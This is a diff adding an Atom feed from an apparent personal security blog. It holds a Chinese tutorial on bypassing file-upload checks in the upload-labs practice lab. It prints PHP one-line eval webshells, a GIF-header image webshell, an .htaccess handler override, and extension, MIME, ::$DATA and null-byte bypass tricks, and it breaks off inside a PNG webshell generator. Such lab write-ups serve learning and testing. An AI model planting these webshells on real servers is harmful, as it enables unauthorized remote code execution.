@@ -1,0 +1,184 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://StarofEden.github.io</id>
+    <title>StarofEden🌸 • Posts by &#34;web&#34; category</title>
+    <link href="https://StarofEden.github.io" />
+    <updated>2024-06-15T16:00:00.000Z</updated>
+    <category term="网络安全" />
+    <category term="ctf" />
+    <category term="web" />
+    <category term="JavaScript" />
+    <category term="nodejs" />
+    <category term="xctf" />
+    <category term="html" />
+    <entry>
+        <id>https://starofeden.github.io/2024/06/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
+        <title>文件上传漏洞</title>
+        <link rel="alternate" href="https://starofeden.github.io/2024/06/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;一句话木马&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php @eval($_POST[&amp;#x27;a&amp;#x27;]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;js验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js验证&#34;&gt;#&lt;/a&gt; js 验证&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;没啥好说的直接禁用 js 就行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121555667.png&#34; alt=&#34;image-20240512155543568&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121557103.png&#34; alt=&#34;image-20240512155718049&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121600818.png&#34; alt=&#34;image-20240512160033723&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;mime&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mime&#34;&gt;#&lt;/a&gt; MIME&lt;/h1&gt;
+&lt;p&gt;服务端 MIME 类型检测是通过检查 http 中包含的 Content-Type 字段中的值来判断上传文件是否合法的。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用 Burp 抓包，将报文中的 Content-Type 改成允许的类型 (上传 a.php)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Content-Type: image/gif（gif 图像）&lt;br&gt;
+        Content-Type: image/jpg（jpg 图像）&lt;br&gt;
+        Content-Type: image/png（png 图像）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121608074.png&#34; alt=&#34;屏幕截图 2024-05-12 160512&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121608989.png&#34; alt=&#34;屏幕截图 2024-05-12 160627&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;黑名单&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黑名单&#34;&gt;#&lt;/a&gt; 黑名单&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;特殊解析后缀：&lt;br&gt;
+.phtml,.php3,.php4,.php5&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;.htaccess 绕过：  （适用于非 nts 的 php 版本）&lt;br&gt;
+上传.htaccess 文件再上传 a.jpg&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;FilesMatch &amp;quot;\.jpg&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;.htaccess 文件把 jpg 文件解析成 php, 这样就可以上传 jpg 类型的 webshell 了然后蚁剑连接。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121700589.png&#34; alt=&#34;image-20240512170051534&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121700730.png&#34; alt=&#34;image-20240512170037675&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121659094.png&#34; alt=&#34;image-20240512165914965&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Win 下 xx.jpg 空格和 xx.jpg. 两种文件是不被允许存在的，要是这样命名文件，windows 系统会默认删除空格或者.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;::&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mtext&gt;在&lt;/mtext&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mtext&gt;的时候如果文件名&lt;/mtext&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA:
+在window的时候如果文件名+&amp;quot;::&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6833em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7778em;vertical-align:-0.0833em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;在&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的时候如果文件名&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;::&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;DATA&amp;quot; 会把::&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mtext&gt;之后的数据当成文件流处理&lt;/mtext&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mtext&gt;不会检测后缀名，且保持&lt;/mtext&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA之后的数据当成文件流处理,不会检测后缀名，且保持::&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8778em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;之后的数据当成文件流处理&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.1667em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;不会检测后缀名，且保持&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;::&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;DATA 之前的文件名，他的目的就是不检查后缀名&lt;br&gt;
+例如:    “phpinfo.php::&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;会自动去掉末尾的&lt;/mtext&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA&amp;quot;    Windows会自动去掉末尾的::&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Win&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;会自动去掉末尾的&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;::&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;DATA 变成 &amp;quot;phpinfo.php”&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;删除文件名末尾的点，再首尾去空，可构造：&lt;br&gt;
+info.php. .(点 + 空格 + 点)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;把黑名单的后缀替换为空：考虑双写绕过&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$file_name = str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;00截断白名单&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#00截断白名单&#34;&gt;#&lt;/a&gt; 00 截断（白名单）&lt;/h1&gt;
+&lt;p&gt;存储路径可控&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务器会把我们上传的文件进行重命名，使用 00 截断后面拼接的内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;get&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#get&#34;&gt;#&lt;/a&gt; get&lt;/h2&gt;
+&lt;p&gt;通常与文件路径结合使用，在文件路径后加个 a.php%00&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_path&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#post&#34;&gt;#&lt;/a&gt; post&lt;/h2&gt;
+&lt;p&gt;后面加个 hex 的 00（使用 bp 工具）&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_path&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;图片马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#图片马&#34;&gt;#&lt;/a&gt; 图片马&lt;/h1&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy kun.jpg /b + a.php /a 1.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;二次渲染及文件头检测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次渲染及文件头检测&#34;&gt;#&lt;/a&gt; &lt;strong&gt;二次渲染及文件头检测&lt;/strong&gt;&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;通常与文件包含漏洞一起出现&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JPEG (jpg)，文件头：FF D8 FF E1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PNG (png)，文件头：89 50 4E 47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GIF (gif)，文件头：47 49 46 38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;上传图片马：&lt;br&gt;
+image.png   GIF89a 是 gif 文件头&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GIF89a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php @eval($_POST[&amp;#x27;a&amp;#x27;]); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121805891.png&#34; alt=&#34;image-20240512180540845&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用文件包含查看是否上传成功。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.1.232/upload-labs-master/include.php?file=upload/3020240512175929.png&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121800650.png&#34; alt=&#34;image-20240512180019592&#34;&gt;&lt;/p&gt;
+&lt;p&gt;需要打开 allow_url_fopen&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121740741.png&#34; alt=&#34;image-20240512174050677&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;突破 gatimagesize 与突破 exif_imagetype 方法同上&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;imagecreatefromjpeg&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#imagecreatefromjpeg&#34;&gt;#&lt;/a&gt; imagecreatefromjpeg()&lt;/h2&gt;
+&lt;p&gt;直接上传的话会打散图片去除末尾的一句话木马，寻找没有打算的地方去插入木马&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;制作一个 gif 图片马&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121831466.png&#34; alt=&#34;image-20240512183129357&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121909520.png&#34; alt=&#34;image-20240512190953363&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将上传的文件下载后用 010 打开，与原文件进行比较，发现一句话木马消失了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121912029.png&#34; alt=&#34;image-20240512191245977&#34;&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121912976.png&#34; alt=&#34;image-20240512191253918&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到没变的地方插入木马，再次上传&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121916610.png&#34; alt=&#34;image-20240512191617523&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121918436.png&#34; alt=&#34;image-20240512191810352&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;成功包含&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121917451.png&#34; alt=&#34;image-20240512191759342&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;png格式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#png格式&#34;&gt;#&lt;/a&gt; &lt;strong&gt;png 格式&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;如果是 png 后缀的话通常是全部改变，需要用脚本生成 webshell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 